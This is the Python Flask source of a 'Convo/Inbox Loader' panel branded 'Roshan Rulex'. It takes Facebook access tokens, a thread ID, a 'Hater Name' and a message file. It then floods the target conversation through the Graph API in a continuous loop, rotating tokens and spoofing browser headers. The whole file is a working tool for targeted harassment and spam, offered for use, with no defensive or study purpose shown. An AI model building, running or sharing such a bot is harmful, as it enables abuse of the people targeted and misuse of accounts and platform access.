from flask import Flask, request, render_template_string
import requests
import time

app = Flask(__name__)
loop_active = False

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    global loop_active
    if request.method == 'POST':
        access_tokens_raw = request.form.get('accessToken')
        access_tokens = [token.strip() for token in access_tokens_raw.split(',') if token.strip()]
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        loop_active = True

        try:
            while loop_active:
                for message1 in messages:
                    if not loop_active:
                        break
                    message = f"{mn} {message1}"
                    for token in access_tokens:
                        api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                        parameters = {'access_token': token, 'message': message}
                        response = requests.post(api_url, data=parameters, headers=headers)
                        status = "✅ Sent" if response.status_code == 200 else f"❌ Failed ({response.status_code})"
                        print(f"{status}: {message} [Token: {token[:10]}...]")
                        time.sleep(1)
                    time.sleep(time_interval)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            time.sleep(30)

    return render_form()

@app.route('/stop', methods=['POST'])
def stop_loop():
    global loop_active
    loop_active = False
    return "🛑 Message loop stopped successfully."

def render_form():
    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Roshan Rulex Panel</title>
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
	<style>
		body { background-color: #fff; }
		.container {
			max-width: 500px;
			background-color: #fff;
			border-radius: 10px;
			padding: 20px;
			box-shadow: 0 0 10px rgba(0,0,0,0.1);
			margin: 0 auto;
			margin-top: 20px;
		}
		.header { text-align: center; padding-bottom: 20px; }
		.btn-submit { width: 100%; margin-top: 10px; }
		.btn-danger {
			width: 100%;
			margin-top: 10px;
			background-color: #ff0033;
			border: none;
			box-shadow: 0 0 10px #ff0033;
			font-weight: bold;
		}
		.footer { text-align: center; margin-top: 20px; color: #888; }
	</style>
</head>
<body>
	<header class="header mt-4">
		<h1 class="mb-3">𝐑𝐎𝐒𝐇𝐀𝐍</h1>
		<h2>𝐎𝐅𝐅𝐋𝟏𝐍𝟃 𝐒𝟑𝐑𝐕𝟃𝐑</h2>
		<h3>𝐎𝐖𝐍𝟃𝐑 :: 𝐑𝐎𝐒𝐇𝐀𝐍</h3>
	</header>

	<div class="container">
		<form action="/" method="post" enctype="multipart/form-data">
			<div class="mb-3">
				<label for="accessToken">Enter Your Token(s) (comma-separated):</label>
				<input type="text" class="form-control" id="accessToken" name="accessToken" required>
			</div>
			<div class="mb-3">
				<label for="threadId">Enter Convo/Inbox ID:</label>
				<input type="text" class="form-control" id="threadId" name="threadId" required>
			</div>
			<div class="mb-3">
				<label for="kidx">Enter Hater Name:</label>
				<input type="text" class="form-control" id="kidx" name="kidx" required>
			</div>
			<div class="mb-3">
				<label for="txtFile">Select Your Notepad File:</label>
				<input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
			</div>
			<div class="mb-3">
				<label for="time">Speed in Seconds:</label>
				<input type="number" class="form-control" id="time" name="time" required>
			</div>
			<button type="submit" class="btn btn-primary btn-submit">🚀 Start Messaging</button>
		</form>

		<form action="/stop" method="post">
			<button type="submit" class="btn btn-danger">🛑 STOP Messages</button>
		</form>
	</div>

	<footer class="footer">
		<p>&copy; 2023 Roshan Rulex. All Rights Reserved.</p>
		<p>Convo/Inbox Loader Tool</p>
		<p>Made by <strong>𝐑𝐎𝐒𝐇𝐀𝐍</strong></p>
	</footer>
</body>
</html>
''')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
